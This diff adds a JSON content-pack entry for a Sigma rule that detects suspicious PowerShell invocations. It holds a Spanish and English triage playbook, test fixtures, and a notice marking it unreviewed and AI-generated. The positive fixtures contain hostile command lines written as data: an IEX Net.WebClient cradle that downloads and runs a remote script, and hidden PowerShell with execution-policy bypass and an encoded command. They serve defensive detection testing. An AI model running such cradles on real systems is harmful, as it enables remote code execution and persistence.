@@ -1,0 +1,136 @@
+{
+  "rule": {
+    "id": "ae7fbf8e-f3cb-49fd-8db4-5f3bed522c71",
+    "title": "Suspicious PowerShell Invocations - Specific",
+    "level": "high",
+    "status": "test",
+    "author": "Florian Roth (Nextron Systems), Jonhnathan Ribeiro",
+    "path": "windows/powershell/powershell_script/posh_ps_susp_invocation_specific.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/powershell/powershell_script/posh_ps_susp_invocation_specific.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1059.001"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Un script block de PowerShell registrado (Event ID 4104) contiene una combinación de parámetros típica de ejecución oculta, payloads en Base64, descarga y ejecución en memoria o persistencia en claves Run.",
+      "what_it_detects": "Coincidencias en ScriptBlockText con seis patrones: -nop -w hidden -c con [Convert]::FromBase64String; -w hidden -noni -nop con iex y New-Object; -w hidden -ep bypass -Enc; reg add de PowerShell sobre claves Run; WebClient oculto con bypass; e iex con Net.WebClient .Download. Se excluye el instalador de Chocolatey.",
+      "why_it_matters": "Son invocaciones clásicas de cargadores y stagers (T1059.001, PowerShell): ocultan la ventana, evitan la política de ejecución, decodifican o descargan código y lo ejecutan en memoria, o dejan persistencia al iniciar sesión.",
+      "triage_steps": [
+        "Lea el ScriptBlockText completo e identifique qué selección coincidió: Base64, -Enc, descarga con WebClient o reg add sobre una clave Run.",
+        "Decodifique cualquier contenido Base64 o -Enc (UTF-16LE) en un entorno aislado y extraiga URLs, IPs, dominios y rutas de archivos.",
+        "Reconstruya script blocks fragmentados usando ScriptBlockId y MessageNumber/MessageTotal en el mismo Computer.",
+        "Pivote a la creación de procesos (4688 o Sysmon 1) en el host +/- 15 minutos: proceso padre, línea de comandos y usuario que lanzó PowerShell.",
+        "Revise la conectividad de red del host hacia las URLs extraídas (proxy, DNS, firewall) y si se descargó o ejecutó un segundo payload.",
+        "Si hubo reg add, consulte las claves Run de HKCU/HKLM y valide el valor creado y el binario o script al que apunta.",
+        "Busque alertas previas para el mismo host, usuario y hash, y las mismas URLs en otros endpoints."
+      ],
+      "false_positives": [
+        "Scripts de despliegue o administración (SCCM, Intune, RMM) que usan -w hidden -ep bypass o -Enc para ejecución silenciosa.",
+        "Instaladores de software o bootstraps internos que descargan con Net.WebClient e iex, similares al de Chocolatey pero no cubiertos por el filtro.",
+        "Herramientas de equipos de red team o pruebas autorizadas."
+      ],
+      "response_steps": [
+        "Confirme con el dueño del sistema o el equipo de TI si la ejecución corresponde a una tarea legítima conocida y documentada.",
+        "Si es maliciosa, aísle el endpoint desde el EDR y bloquee en proxy y firewall las URLs, dominios e IPs identificados.",
+        "Elimine la persistencia verificada (valores Run, tareas, archivos descargados) tras preservar evidencia: script blocks, memoria y artefactos.",
+        "Restablezca credenciales del usuario afectado y busque el mismo patrón en el resto de la flota.",
+        "Si es legítima, documente la excepción con un filtro acotado por script o ruta, no por host completo."
+      ],
+      "severity_rationale": "El nivel high es adecuado porque estas combinaciones de parámetros son poco comunes en uso legítimo y se asocian directamente con ejecución oculta de código o persistencia."
+    },
+    "en": {
+      "summary": "A logged PowerShell script block (Event ID 4104) contains a parameter combination typical of hidden execution, Base64 payloads, download-and-execute in memory, or Run-key persistence.",
+      "what_it_detects": "ScriptBlockText matching one of six patterns: -nop -w hidden -c with [Convert]::FromBase64String; -w hidden -noni -nop with iex and New-Object; -w hidden -ep bypass -Enc; PowerShell reg add on Run keys; hidden bypassed WebClient download; iex with Net.WebClient .Download. The Chocolatey installer is excluded.",
+      "why_it_matters": "These are classic loader and stager invocations (T1059.001, PowerShell): they hide the window, bypass execution policy, decode or download code and run it in memory, or set logon persistence.",
+      "triage_steps": [
+        "Read the full ScriptBlockText and identify which selection matched: Base64, -Enc, WebClient download, or reg add on a Run key.",
+        "Decode any Base64 or -Enc content (UTF-16LE) in a sandbox and extract URLs, IPs, domains and file paths.",
+        "Rebuild split script blocks using ScriptBlockId and MessageNumber/MessageTotal on the same Computer.",
+        "Pivot to process creation (4688 or Sysmon 1) on the host +/- 15 minutes: parent process, command line and user that launched PowerShell.",
+        "Check proxy, DNS and firewall logs for connections to extracted URLs and whether a second-stage payload was fetched or run.",
+        "If reg add was used, inspect HKCU/HKLM Run keys and validate the created value and its target.",
+        "Search earlier alerts for the same host, user and hash, and the same URLs on other endpoints."
+      ],
+      "false_positives": [
+        "Deployment or admin scripts (SCCM, Intune, RMM) using -w hidden -ep bypass or -Enc for silent execution.",
+        "Software installers or internal bootstraps using Net.WebClient with iex, similar to Chocolatey but not covered by the filter.",
+        "Authorized red team or penetration testing tools."
+      ],
+      "response_steps": [
+        "Confirm with the system owner or IT whether the execution matches a known, documented task.",
+        "If malicious, isolate the endpoint via EDR and block identified URLs, domains and IPs at proxy and firewall.",
+        "Remove verified persistence (Run values, tasks, downloaded files) after preserving evidence: script blocks, memory and artifacts.",
+        "Reset the affected user's credentials and hunt for the same pattern across the fleet.",
+        "If legitimate, document a narrow exception scoped to the script or path, not the whole host."
+      ],
+      "severity_rationale": "High fits because these parameter combinations are rare in legitimate use and map directly to hidden code execution or persistence."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "Download cradle executing a remote script in memory with IEX and Net.WebClient (selection_iex_webclient).",
+        "event": {
+          "EventID": 4104,
+          "Channel": "Microsoft-Windows-PowerShell/Operational",
+          "Computer": "WS-0142.andes.example.com",
+          "ScriptBlockId": "3f2a9c1e-7b4d-4e8a-9c21-5d6f0a1b2c3d",
+          "MessageNumber": 1,
+          "MessageTotal": 1,
+          "Path": "",
+          "ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/update.ps1')"
+        }
+      },
+      {
+        "description": "Hidden PowerShell launched with execution policy bypass and an encoded command (selection_enc_selection).",
+        "event": {
+          "EventID": 4104,
+          "Channel": "Microsoft-Windows-PowerShell/Operational",
+          "Computer": "WS-0207.andes.example.com",
+          "ScriptBlockId": "8c1d4e2f-0a9b-4c7d-8e6f-1a2b3c4d5e6f",
+          "MessageNumber": 1,
+          "MessageTotal": 1,
+          "Path": "C:\\Users\\Public\\run.ps1",
+          "ScriptBlockText": "Start-Process powershell.exe -ArgumentList '-nop -w hidden -ep bypass -Enc VwByAGkAdABlAC0ASABvAHMAdAAgAHQAZQBzAHQA'"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Official Chocolatey installer one-liner: matches selection_iex_webclient but is excluded by filter_chocolatey.",
+        "event": {
+          "EventID": 4104,
+          "Channel": "Microsoft-Windows-PowerShell/Operational",
+          "Computer": "WS-0142.andes.example.com",
+          "ScriptBlockId": "b7e6d5c4-3a2b-4c1d-9e8f-7a6b5c4d3e2f",
+          "MessageNumber": 1,
+          "MessageTotal": 1,
+          "Path": "",
+          "ScriptBlockText": "Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))"
+        }
+      },
+      {
+        "description": "WebClient file download to disk without iex or hidden/bypass parameters; no selection is fully satisfied.",
+        "event": {
+          "EventID": 4104,
+          "Channel": "Microsoft-Windows-PowerShell/Operational",
+          "Computer": "SRV-APP-03.andes.example.com",
+          "ScriptBlockId": "1a2b3c4d-5e6f-4a7b-8c9d-0e1f2a3b4c5d",
+          "MessageNumber": 1,
+          "MessageTotal": 1,
+          "Path": "C:\\Scripts\\deploy_agent.ps1",
+          "ScriptBlockText": "(New-Object Net.WebClient).DownloadFile('https://downloads.example.com/agent.msi', 'C:\\Temp\\agent.msi')"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-25T21:59:49+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
